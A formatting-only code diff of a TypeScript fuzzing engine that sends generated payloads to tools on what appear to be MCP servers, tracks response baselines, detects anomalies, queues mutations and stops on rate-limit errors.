       shouldAbort?: () => boolean;
-    }
+    },
   ): Promise<void> {
     const { onResult, onError, shouldAbort } = options ?? {};
 
@@ -967,12 +1015,23 @@ class PromisePool<T, R> {
           this.running++;
 
           executor(item, currentIndex)
-            .then(result => { onResult?.(result, item, currentIndex); })
-            .catch(err  => { onError?.(err instanceof Error ? err : new Error(String(err)), item, currentIndex); })
+            .then((result) => {
+              onResult?.(result, item, currentIndex);
+            })
+            .catch((err) => {
+              onError?.(
+                err instanceof Error ? err : new Error(String(err)),
+                item,
+                currentIndex,
+              );
+            })
             .finally(() => {
               this.running--;
               completed++;
-              if (completed === items.length || (shouldAbort?.() && this.running === 0)) {
+              if (
+                completed === items.length ||
+                (shouldAbort?.() && this.running === 0)
+              ) {
                 resolve();
               } else {
                 next();
@@ -1003,17 +1062,21 @@ class ResponseBaseline {
     this.responseSizes.push(responseSizeBytes);
     // Keep a rolling window to avoid memory growth in long sessions
     if (this.responseTimes.length > 200) this.responseTimes.shift();
-    if (this.responseSizes.length  > 200) this.responseSizes.shift();
+    if (this.responseSizes.length > 200) this.responseSizes.shift();
   }
 
   get averageTimeMs(): number {
     if (this.responseTimes.length === 0) return 0;
-    return this.responseTimes.reduce((a, b) => a + b, 0) / this.responseTimes.length;
+    return (
+      this.responseTimes.reduce((a, b) => a + b, 0) / this.responseTimes.length
+    );
   }
 
   get averageSizeBytes(): number {
     if (this.responseSizes.length === 0) return 0;
-    return this.responseSizes.reduce((a, b) => a + b, 0) / this.responseSizes.length;
+    return (
+      this.responseSizes.reduce((a, b) => a + b, 0) / this.responseSizes.length
+    );
   }
 
   get isWarmedUp(): boolean {
@@ -1027,14 +1090,25 @@ class ResponseBaseline {
 
 export class FuzzerEngine {
   private config: Required<
-    Omit<FuzzerEngineConfig,
-      | 'generatorConfig' | 'onProgress' | 'onVulnerability'
-      | 'fingerprintConfig' | 'onFingerprint' | 'onInterestingResponse'
+    Omit<
+      FuzzerEngineConfig,
+      | "generatorConfig"
+      | "onProgress"
+      | "onVulnerability"
+      | "fingerprintConfig"
+      | "onFingerprint"
+      | "onInterestingResponse"
     >
-  > & Pick<FuzzerEngineConfig,
-    | 'generatorConfig' | 'onProgress' | 'onVulnerability'
-    | 'fingerprintConfig' | 'onFingerprint' | 'onInterestingResponse'
-  >;
+  > &
+    Pick<
+      FuzzerEngineConfig,
+      | "generatorConfig"
+      | "onProgress"
+      | "onVulnerability"
+      | "fingerprintConfig"
+      | "onFingerprint"
+      | "onInterestingResponse"
+    >;
 
   private session: FuzzingSession | null = null;
   private abortController: AbortController | null = null;
@@ -1048,22 +1122,22 @@ export class FuzzerEngine {
 
   constructor(config: FuzzerEngineConfig) {
     this.config = {
-      timeout:                    5_000,
-      delayBetweenRequests:       100,
-      concurrency:                1,
-      stopOnFirstVulnerability:   false,
-      enableFingerprinting:       false,
-      enableFeedbackLoop:         true,
-      timingAnomalyThresholdMs:   2_000,
-      timingAnomalyMultiplier:    2.0,
-      structuralDriftThreshold:   0.5,
-      maxMutationRounds:          2,
+      timeout: 5_000,
+      delayBetweenRequests: 100,
+      concurrency: 1,
+      stopOnFirstVulnerability: false,
+      enableFingerprinting: false,
+      enableFeedbackLoop: true,
+      timingAnomalyThresholdMs: 2_000,
+      timingAnomalyMultiplier: 2.0,
+      structuralDriftThreshold: 0.5,
+      maxMutationRounds: 2,
       ...config,
     };
 
-    this.fingerprinter  = new Fingerprinter(config.fingerprintConfig);
+    this.fingerprinter = new Fingerprinter(config.fingerprintConfig);
     this.mutationEngine = new MutationEngine();
-    this.baseline       = new ResponseBaseline();
+    this.baseline = new ResponseBaseline();
   }
 
   // -------------------------------------------------------------------------
@@ -1071,25 +1145,36 @@ export class FuzzerEngine {
   // -------------------------------------------------------------------------
 
   generatePayloads(toolSchema?: Record<string, unknown>): GeneratedPayload[] {
-    return this.generatePayloadsFromGenerators(this.config.generators, toolSchema);
+    return this.generatePayloadsFromGenerators(
+      this.config.generators,
+      toolSchema,
+    );
   }
 
-  abort(reason = 'User requested abort'): void {
+  abort(reason = "User requested abort"): void {
     if (this.abortController) {
       this.abortController.abort();
       if (this.session) {
-        this.session.aborted     = true;
+        this.session.aborted = true;
         this.session.abortReason = reason;
       }
     }
   }
 
   isRunning(): boolean {
-    return this.abortController !== null && !this.abortController.signal.aborted;
+    return (
+      this.abortController !== null && !this.abortController.signal.aborted
+    );
   }
 
-  async runFingerprint(target: FuzzTarget, toolName: string): Promise<ServerFingerprint> {
-    this.lastFingerprint = await this.fingerprinter.fingerprint(target, toolName);
+  async runFingerprint(
+    target: FuzzTarget,
+    toolName: string,
+  ): Promise<ServerFingerprint> {
+    this.lastFingerprint = await this.fingerprinter.fingerprint(
+      target,
+      toolName,
+    );
     return this.lastFingerprint;
   }
 
@@ -1108,14 +1193,14 @@ export class FuzzerEngine {
   async fuzz(
     target: FuzzTarget,
     toolName: string,
-    toolSchema?: Record<string, unknown>
+    toolSchema?: Record<string, unknown>,
   ): Promise<FuzzingSession> {
     this.abortController = new AbortController();
-    this.baseline        = new ResponseBaseline();
-    this.mutationRound   = 0;
+    this.baseline = new ResponseBaseline();
+    this.mutationRound = 0;
 
     // ── Fingerprinting phase ──────────────────────────────────────────────
-    let activeGenerators    = this.config.generators;
+    let activeGenerators = this.config.generators;
     let disabledGenerators: string[] = [];
     let fingerprint: ServerFingerprint | undefined;
 
@@ -1124,13 +1209,19 @@ export class FuzzerEngine {
       this.lastFingerprint = fingerprint;
       this.config.onFingerprint?.(fingerprint);
 
-      const filtered      = this.filterGeneratorsByFingerprint(this.config.generators, fingerprint);
-      activeGenerators    = filtered.active;
-      disabledGenerators  = filtered.disabled;
+      const filtered = this.filterGeneratorsByFingerprint(
+        this.config.generators,
+        fingerprint,
+      );
+      activeGenerators = filtered.active;
+      disabledGenerators = filtered.disabled;
     }
 
     // ── Payload generation ────────────────────────────────────────────────
-    const initialPayloads = this.generatePayloadsFromGenerators(activeGenerators, toolSchema);
+    const initialPayloads = this.generatePayloadsFromGenerators(
+      activeGenerators,
+      toolSchema,
+    );
 
     // ── Baseline calibration (NEW in v1.0) ───────────────────────────────
     // Send a small batch of low-risk payloads first to establish timing and
@@ -1140,24 +1231,25 @@ export class FuzzerEngine {
     // ── Session init ──────────────────────────────────────────────────────
     const feedbackStats: FeedbackStats = {
       interestingResponsesFound: 0,
-      mutationsInjected:         0,
-      mutationRoundsCompleted:   0,
-      timingAnomaliesDetected:   0,
-      structuralDriftDetected:   0,
-      serverCrashesDetected:     0,
+      mutationsInjected: 0,
+      mutationRoundsCompleted: 0,
+      timingAnomaliesDetected: 0,
+      structuralDriftDetected: 0,
+      serverCrashesDetected: 0,
     };
 
     this.session = {
-      id:                 this.generateSessionId(),
-      startedAt:          new Date(),
-      totalPayloads:      initialPayloads.length, // grows dynamically
-      payloadsExecuted:   0,
-      vulnerabilities:    [],
+      id: this.generateSessionId(),
+      startedAt: new Date(),
+      totalPayloads: initialPayloads.length, // grows dynamically
+      payloadsExecuted: 0,
+      vulnerabilities: [],
       payloadsByCategory: this.countByCategory(initialPayloads),
-      errors:             [],
-      aborted:            false,
+      errors: [],
+      aborted: false,
       fingerprint,
-      disabledGenerators: disabledGenerators.length > 0 ? disabledGenerators : undefined,
+      disabledGenerators:
+        disabledGenerators.length > 0 ? disabledGenerators : undefined,
       feedbackStats,
       // eslint-disable-next-line @typescript-eslint/ban-ts-comment
       // @ts-ignore - feedbackStats is not part of FuzzingSession in v1 but we added it in fuzz.ts
@@ -1180,7 +1272,9 @@ export class FuzzerEngine {
       toolName,
       feedbackStats,
       () => foundVulnerability,
-      (found) => { foundVulnerability = found; }
+      (found) => {
+        foundVulnerability = found;
+      },
     );
 
     // ── Finalise ──────────────────────────────────────────────────────────
@@ -1204,9 +1298,9 @@ export class FuzzerEngine {
     toolName: string,
     feedbackStats: FeedbackStats,
     isVulnerabilityFound: () => boolean,
-    setVulnerabilityFound: (v: boolean) => void
+    setVulnerabilityFound: (v: boolean) => void,
   ): Promise<void> {
-    const session     = this.session!;
+    const session = this.session!;
     const concurrency = this.config.concurrency;
 
     return new Promise((resolve) => {
@@ -1231,9 +1325,9 @@ export class FuzzerEngine {
             .catch((err: unknown) => {
               const fuzzError: FuzzingError = {
                 payload,
-                message:   err instanceof Error ? err.message : String(err),
-                stack:     err instanceof Error ? err.stack : undefined,
-                code:      (err as NodeJS.ErrnoException).code,
+                message: err instanceof Error ? err.message : String(err),
+                stack: err instanceof Error ? err.stack : undefined,
+                code: (err as NodeJS.ErrnoException).code,
                 timestamp: new Date(),
               };
               session.errors.push(fuzzError);
@@ -1255,9 +1349,10 @@ export class FuzzerEngine {
 
         // If nothing is in-flight and the queue is empty OR we are stopped, we're done
         if (inFlight === 0) {
-          const isStopped = this.abortController!.signal.aborted || 
-                           (this.config.stopOnFirstVulnerability && isVulnerabilityFound());
-          
+          const isStopped =
+            this.abortController!.signal.aborted ||
+            (this.config.stopOnFirstVulnerability && isVulnerabilityFound());
+
           if (queue.isEmpty() || isStopped) {
             resolve();
           }
@@ -1287,7 +1382,7 @@ export class FuzzerEngine {
     target: FuzzTarget,
     toolName: string,
     queue: DynamicPayloadQueue,
-    feedbackStats: FeedbackStats
+    feedbackStats: FeedbackStats,
   ): Promise<{ vulnFound: boolean }> {
     const session = this.session!;
     let vulnFound = false;
@@ -1299,33 +1394,38 @@ export class FuzzerEngine {
     if (result.isError && result.error) {
       const errorStr = String(result.error).toLowerCase();
       // HTTP 429 detection
-      if (errorStr.includes('429') || errorStr.includes('too many requests') || errorStr.includes('rate limit')) {
+      if (
+        errorStr.includes("429") ||
+        errorStr.includes("too many requests") ||
+        errorStr.includes("rate limit")
+      ) {
         session.aborted = true;
-        session.abortReason = 'API_QUOTA_EXCEEDED';
-        this.abort('API quota exceeded (429 Too Many Requests)');
-        throw new Error('PANIC_STOP_429');
+        session.abortReason = "API_QUOTA_EXCEEDED";
+        this.abort("API quota exceeded (429 Too Many Requests)");
+        throw new Error("PANIC_STOP_429");
       }
     }
 
     // Check JSON-RPC response for rate limit errors
-    if (result.response && typeof result.response === 'object') {
+    if (result.response && typeof result.response === "object") {
       const resp = result.response as Record<string, unknown>;
-      if (resp.error && typeof resp.error === 'object') {
+      if (resp.error && typeof resp.error === "object") {
         const err = resp.error as Record<string, unknown>;
         const errorCode = err.code;
-        const errorMessage = String(err.message || '').toLowerCase();
+        const errorMessage = String(err.message || "").toLowerCase();
         // JSON-RPC rate limit codes: -32000 to -32099 (server errors)
         // Common rate limit messages
         if (
-          (typeof errorCode === 'number' && (errorCode === -32000 || errorCode === 429)) ||
-          errorMessage.includes('rate limit') ||
-          errorMessage.includes('too many requests') ||
-          errorMessage.includes('quota exceeded')
+          (typeof errorCode === "number" &&
+            (errorCode === -32000 || errorCode === 429)) ||
+          errorMessage.includes("rate limit") ||
+          errorMessage.includes("too many requests") ||
+          errorMessage.includes("quota exceeded")
         ) {
           session.aborted = true;
-          session.abortReason = 'API_QUOTA_EXCEEDED';
-          this.abort('API quota exceeded (JSON-RPC rate limit error)');
-          throw new Error('PANIC_STOP_429');
+          session.abortReason = "API_QUOTA_EXCEEDED";
+          this.abort("API quota exceeded (JSON-RPC rate limit error)");
+          throw new Error("PANIC_STOP_429");
         }
       }
     }
@@ -1344,26 +1444,28 @@ export class FuzzerEngine {
     // Detectors can use these pre-computed signals as corroborating evidence
     // without having to re-derive them from the raw response independently.
     const engineHint = {
-      isAnomaly:        analysis.interestLevel !== 'not_interesting',
-      anomalyReasons:   analysis.reasons,
-      isMutation:       payload.metadata?.['isMutation'] === true,
-      mutationStrategy: typeof payload.metadata?.['mutationStrategy'] === 'string'
-        ? payload.metadata['mutationStrategy'] as string
-        : undefined,
-      originalCategory: typeof payload.metadata?.['originalCategory'] === 'string'
-        ? payload.metadata['originalCategory'] as string
-        : payload.category,
+      isAnomaly: analysis.interestLevel !== "not_interesting",
+      anomalyReasons: analysis.reasons,
+      isMutation: payload.metadata?.["isMutation"] === true,
+      mutationStrategy:
+        typeof payload.metadata?.["mutationStrategy"] === "string"
+          ? (payload.metadata["mutationStrategy"] as string)
+          : undefined,
+      originalCategory:
+        typeof payload.metadata?.["originalCategory"] === "string"
+          ? (payload.metadata["originalCategory"] as string)
+          : payload.category,
       engineBaselineMs: analysis.averageResponseTimeMs,
     };
 
     // ── Step 4: Vulnerability detection — context now carries the EngineHint ─
     const context: DetectorContext = {
-      payload:        payload.value,
+      payload: payload.value,
       toolName,
-      response:       result.response,
+      response: result.response,
       responseTimeMs: result.responseTimeMs,
-      isError:        result.isError,
-      error:          result.error,
+      isError: result.isError,
+      error: result.error,
       engineHint,
     };
 
@@ -1381,26 +1483,34 @@ export class FuzzerEngine {
     // ── Step 5: Feedback loop — reuses `analysis` calculated in Step 1 ───────
     // Note: analyzeResponse is NOT called again here; `analysis` is reused.
     if (this.config.enableFeedbackLoop) {
-      if (analysis.interestLevel !== 'not_interesting') {
+      if (analysis.interestLevel !== "not_interesting") {
         feedbackStats.interestingResponsesFound++;
 
         // Update specific counters
-        if (analysis.reasons.includes('timing_anomaly'))   feedbackStats.timingAnomaliesDetected++;
-        if (analysis.reasons.includes('structural_drift')) feedbackStats.structuralDriftDetected++;
-        if (analysis.reasons.includes('server_crash'))     feedbackStats.serverCrashesDetected++;
+        if (analysis.reasons.includes("timing_anomaly"))
+          feedbackStats.timingAnomaliesDetected++;
+        if (analysis.reasons.includes("structural_drift"))
+          feedbackStats.structuralDriftDetected++;
+        if (analysis.reasons.includes("server_crash"))
+          feedbackStats.serverCrashesDetected++;
 
         // Notify caller
         this.config.onInterestingResponse?.(analysis, payload);
 
         // Inject mutations if we haven't exceeded the round limit
-        const isMutation   = payload.metadata?.['isMutation'] === true;
-        const currentRound = typeof payload.metadata?.['mutationRound'] === 'number'
-          ? payload.metadata['mutationRound'] as number
-          : 0;
+        const isMutation = payload.metadata?.["isMutation"] === true;
+        const currentRound =
+          typeof payload.metadata?.["mutationRound"] === "number"
+            ? (payload.metadata["mutationRound"] as number)
+            : 0;
 
         if (!isMutation || currentRound < this.config.maxMutationRounds) {
           const nextRound = isMutation ? currentRound + 1 : 1;
-          const mutations = this.mutationEngine.mutate(payload, analysis.reasons, nextRound);
+          const mutations = this.mutationEngine.mutate(
+            payload,
+            analysis.reasons,
+            nextRound,
+          );
 
           if (mutations.length > 0) {
             queue.enqueueHigh(mutations);
@@ -1443,14 +1553,15 @@ export class FuzzerEngine {
       isError: boolean;
       error?: { code: number; message: string };
     },
-    payload: GeneratedPayload
+    payload: GeneratedPayload,
   ): ResponseAnalysis {
     const reasons: InterestReason[] = [];
 
     // Serialise response for size comparison
-    const responseStr       = result.response != null ? JSON.stringify(result.response) : '';
-    const responseSizeBytes = Buffer.byteLength(responseStr, 'utf8');
-    const averageTimeMs     = this.baseline.averageTimeMs;
+    const responseStr =
+      result.response != null ? JSON.stringify(result.response) : "";
+    const responseSizeBytes = Buffer.byteLength(responseStr, "utf8");
+    const averageTimeMs = this.baseline.averageTimeMs;
     const baselineSizeBytes = this.baseline.averageSizeBytes;
 
     // ── 1. Server crash detection ─────────────────────────────────────────
@@ -1458,37 +1569,47 @@ export class FuzzerEngine {
       const code = result.error.code;
       // MCP internal error (-32000 to -32099) or JSON-RPC server error (-32603)
       if (code === -32603 || (code >= -32099 && code <= -32000)) {
-        reasons.push('server_crash');
+        reasons.push("server_crash");
       }
     }
 
     // ── 2. Empty / null response ──────────────────────────────────────────
-    if (!result.isError && (result.response == null || responseStr === '{}' || responseStr === '""')) {
-      reasons.push('empty_response');
+    if (
+      !result.isError &&
+      (result.response == null || responseStr === "{}" || responseStr === '""')
+    ) {
+      reasons.push("empty_response");
     }
 
     // ── 3. Timing anomaly ─────────────────────────────────────────────────
     if (this.baseline.isWarmedUp) {
-      const exceedsAbsolute   = result.responseTimeMs > this.config.timingAnomalyThresholdMs;
-      
+      const exceedsAbsolute =
+        result.responseTimeMs > this.config.timingAnomalyThresholdMs;
+
       // Prevent jitter on fast connections (e.g. 2ms -> 7ms) from triggering anomalies
       // Only apply multiplier if the response is at least 200ms (or threshold/10)
-      const minDuration = Math.min(200, this.config.timingAnomalyThresholdMs / 10);
-      
-      const exceedsMultiplier = averageTimeMs > 0 &&
-        result.responseTimeMs > averageTimeMs * this.config.timingAnomalyMultiplier &&
+      const minDuration = Math.min(
+        200,
+        this.config.timingAnomalyThresholdMs / 10,
+      );
+
+      const exceedsMultiplier =
+        averageTimeMs > 0 &&
+        result.responseTimeMs >
+          averageTimeMs * this.config.timingAnomalyMultiplier &&
         result.responseTimeMs > minDuration;
 
       if (exceedsAbsolute || exceedsMultiplier) {
-        reasons.push('timing_anomaly');
+        reasons.push("timing_anomaly");
       }
     }
 
     // ── 4. Structural drift ───────────────────────────────────────────────
     if (this.baseline.isWarmedUp && baselineSizeBytes > 0) {
-      const sizeDelta = Math.abs(responseSizeBytes - baselineSizeBytes) / baselineSizeBytes;
+      const sizeDelta =
+        Math.abs(responseSizeBytes - baselineSizeBytes) / baselineSizeBytes;
       if (sizeDelta > this.config.structuralDriftThreshold) {
-        reasons.push('structural_drift');
+        reasons.push("structural_drift");
       }
     }
 
@@ -1501,22 +1622,25 @@ export class FuzzerEngine {
       /internal server error/i,
       /\beval\b.*\bfailed\b/i,
     ];
-    if (ERROR_PATTERNS.some(re => re.test(responseStr))) {
-      reasons.push('error_pattern_match');
+    if (ERROR_PATTERNS.some((re) => re.test(responseStr))) {
+      reasons.push("error_pattern_match");
     }
 
     // ── Compute interest level ────────────────────────────────────────────
-    let interestLevel: InterestLevel = 'not_interesting';
-    if (reasons.includes('server_crash') || reasons.includes('empty_response')) {
-      interestLevel = 'high_priority';
+    let interestLevel: InterestLevel = "not_interesting";
+    if (
+      reasons.includes("server_crash") ||
+      reasons.includes("empty_response")
+    ) {
+      interestLevel = "high_priority";
     } else if (reasons.length > 0) {
-      interestLevel = 'interesting';
+      interestLevel = "interesting";
     }
 
     return {
       interestLevel,
       reasons,
-      responseTimeMs:   result.responseTimeMs,
+      responseTimeMs: result.responseTimeMs,
       averageResponseTimeMs: averageTimeMs,
       responseSizeBytes,
       baselineSizeBytes,
@@ -1536,19 +1660,19 @@ export class FuzzerEngine {
   private async calibrateBaseline(
     target: FuzzTarget,
     toolName: string,
-    payloads: GeneratedPayload[]
+    payloads: GeneratedPayload[],
   ): Promise<void> {
     const CALIBRATION_SAMPLES = 5;
     const candidates = payloads
-      .filter(p => p.severity === 'low' || p.severity === 'medium')
+      .filter((p) => p.severity === "low" || p.severity === "medium")
       .slice(0, CALIBRATION_SAMPLES);
 
     for (const payload of candidates) {
       try {
         const result = await target.execute(payload);
-        const size   = Buffer.byteLength(
-          result.response != null ? JSON.stringify(result.response) : '',
-          'utf8'
+        const size = Buffer.byteLength(
+          result.response != null ? JSON.stringify(result.response) : "",
+          "utf8",
         );
         this.baseline.record(result.responseTimeMs, size);
       } catch {
@@ -1561,16 +1685,20 @@ export class FuzzerEngine {
   // Progress emission helper
   // -------------------------------------------------------------------------
 
-  private emitProgress(queue: DynamicPayloadQueue, session: FuzzingSession): void {
+  private emitProgress(
+    queue: DynamicPayloadQueue,
+    session: FuzzingSession,
+  ): void {
     const total = queue.totalEnqueued;
     this.config.onProgress?.({
-      current:              session.payloadsExecuted,
+      current: session.payloadsExecuted,
       total,
-      percentage:           total > 0 ? Math.round((session.payloadsExecuted / total) * 100) : 0,
+      percentage:
+        total > 0 ? Math.round((session.payloadsExecuted / total) * 100) : 0,
       vulnerabilitiesFound: session.vulnerabilities.length,
-      errorsEncountered:    session.errors.length,
-      mutationsQueued:      queue.highSize,
-      mutationRound:        this.mutationRound,
+      errorsEncountered: session.errors.length,
+      mutationsQueued: queue.highSize,
+      mutationRound: this.mutationRound,
     });
   }
 
@@ -1582,7 +1710,8 @@ export class FuzzerEngine {
     if (!this.session) return null;
 
     const duration = this.session.endedAt
-      ? (this.session.endedAt.getTime() - this.session.startedAt.getTime()) / 1000
+      ? (this.session.endedAt.getTime() - this.session.startedAt.getTime()) /
+        1000
       : 0;
 
     const fb = this.session.feedbackStats;
@@ -1600,8 +1729,8 @@ export class FuzzerEngine {
     }
 
     lines.push(
-      '',
-      '── Feedback Loop ──────────────────────────────',
+      "",
+      "── Feedback Loop ──────────────────────────────",
       `Interesting responses : ${fb.interestingResponsesFound}`,
       `Mutations injected    : ${fb.mutationsInjected}`,
       `Mutation rounds       : ${fb.mutationRoundsCompleted}`,
@@ -1611,20 +1740,22 @@ export class FuzzerEngine {
     );
 
     if (this.session.fingerprint) {
-      lines.push('', '── Fingerprint ────────────────────────────────');
+      lines.push("", "── Fingerprint ────────────────────────────────");
       lines.push(`  ${this.session.fingerprint.summary}`);
       if (this.session.disabledGenerators?.length) {
-        lines.push(`  Disabled: ${this.session.disabledGenerators.join(', ')}`);
+        lines.push(`  Disabled: ${this.session.disabledGenerators.join(", ")}`);
       }
     }
 
-    lines.push('', '── By Category ────────────────────────────────');
-    for (const [cat, count] of Object.entries(this.session.payloadsByCategory)) {
+    lines.push("", "── By Category ────────────────────────────────");
+    for (const [cat, count] of Object.entries(
+      this.session.payloadsByCategory,
+    )) {
       lines.push(`  ${cat}: ${count}`);
     }
 
     if (this.session.vulnerabilities.length > 0) {
-      lines.push('', '── Vulnerabilities ────────────────────────────');
+      lines.push("", "── Vulnerabilities ────────────────────────────");
       const bySeverity: Record<string, number> = {};
       for (const v of this.session.vulnerabilities) {
         bySeverity[v.severity] = (bySeverity[v.severity] ?? 0) + 1;
@@ -1634,7 +1765,7 @@ export class FuzzerEngine {
       }
     }
 
-    return lines.join('\n');
+    return lines.join("\n");
   }
 
   // -------------------------------------------------------------------------
@@ -1643,12 +1774,14 @@ export class FuzzerEngine {
 
   private generatePayloadsFromGenerators(
     generators: IPayloadGenerator[],
-    toolSchema?: Record<string, unknown>
+    toolSchema?: Record<string, unknown>,
   ): GeneratedPayload[] {
     const all: GeneratedPayload[] = [];
     for (const gen of generators) {
       if (toolSchema && gen.generateForSchema) {
-        all.push(...gen.generateForSchema(toolSchema, this.config.generatorConfig));
+        all.push(
+          ...gen.generateForSchema(toolSchema, this.config.generatorConfig),
+        );
       } else {
         all.push(...gen.generate(this.config.generatorConfig));
       }
@@ -1658,12 +1791,14 @@ export class FuzzerEngine {
 
   private filterGeneratorsByFingerprint(
     generators: IPayloadGenerator[],
-    fingerprint: ServerFingerprint
+    fingerprint: ServerFingerprint,
   ): { active: IPayloadGenerator[]; disabled: string[] } {
     const disabled = new Set(fingerprint.disabledGenerators);
     return {
-      active:   generators.filter(g => !disabled.has(g.constructor.name)),
-      disabled: generators.filter(g =>  disabled.has(g.constructor.name)).map(g => g.constructor.name),
+      active: generators.filter((g) => !disabled.has(g.constructor.name)),
+      disabled: generators
+        .filter((g) => disabled.has(g.constructor.name))
+        .map((g) => g.constructor.name),
     };
   }
 
@@ -1671,7 +1806,9 @@ export class FuzzerEngine {
     return `fuzz-${Date.now()}-${Math.random().toString(36).substring(2, 11)}`;
   }
 
-  private countByCategory(payloads: GeneratedPayload[]): Record<string, number> {
+  private countByCategory(
+    payloads: GeneratedPayload[],
+  ): Record<string, number> {
     const counts: Record<string, number> = {};
     for (const p of payloads) {
       counts[p.category] = (counts[p.category] ?? 0) + 1;
